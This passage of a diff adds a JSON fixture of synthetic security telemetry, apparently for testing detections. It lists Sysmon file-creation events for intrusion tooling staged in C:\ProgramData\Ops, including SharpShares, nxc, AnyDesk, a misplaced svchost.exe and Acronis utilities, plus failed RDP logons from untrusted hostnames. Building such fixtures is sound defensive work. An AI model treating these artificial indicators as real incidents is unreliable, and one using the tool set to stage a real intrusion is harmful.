+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\Socks.exe",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\Socks_werfault.exe",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\subs.txt",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\svchost.exe",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\wa_3rd_party_host_sample.exe",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\winrar.exe",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\AnyDesk.exe",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\SharpShares.exe",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\AcronisDiskDirector-12.5",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\acro.exe",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\DiskDirector.exe",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\Acronis.exe",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\b2.exe",
+            "action": "created"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "sysmon.jsonl",
+          "dataset": "Endpoint.Filesystem",
+          "fields": {
+            "dest": {
+              "ref": "asset:prod-file-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "file_path": "C:\\ProgramData\\Ops\\nxc.exe",
+            "action": "created"
+          },
+          "delay_ms": 0
+        }
+      ]
+    },
+    {
+      "id": "historical-hostname-coverage",
+      "offset_seconds": 4980,
+      "description": "Independent hostname matching fixtures: synthetic failed RDP logons identify untrusted clients by hostname. The publication gives no placement/IP association; these are not new managed assets or proof of successful access.",
+      "depends_on": [],
+      "observations": [
+        {
+          "source": "windows-security.jsonl",
+          "dataset": "Authentication.Authentication",
+          "fields": {
+            "src": "WIN-SBOE3CPNAL",
+            "dest": {
+              "ref": "asset:prod-rdp-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "action": "failure",
+            "app": "rdp"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "windows-security.jsonl",
+          "dataset": "Authentication.Authentication",
+          "fields": {
+            "src": "WIN-3IUUOFVTQAR",
+            "dest": {
+              "ref": "asset:prod-rdp-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "action": "failure",
+            "app": "rdp"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "windows-security.jsonl",
+          "dataset": "Authentication.Authentication",
+          "fields": {
+            "src": "WIN-DK18BI83M0S",
+            "dest": {
+              "ref": "asset:prod-rdp-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "action": "failure",
+            "app": "rdp"
+          },
+          "delay_ms": 0
+        },
+        {
+          "source": "windows-security.jsonl",
+          "dataset": "Authentication.Authentication",
+          "fields": {
+            "src": "WIN-I1HRRJHCEIV",
+            "dest": {
+              "ref": "asset:prod-rdp-01:fqdn"
+            },
+            "user": {
+              "ref": "identity:identity-admin-01:account"
+            },
+            "action": "failure",
+            "app": "rdp"
+          },
+          "delay_ms": 0
+        }
+      ]
+    }
+  ]
+}
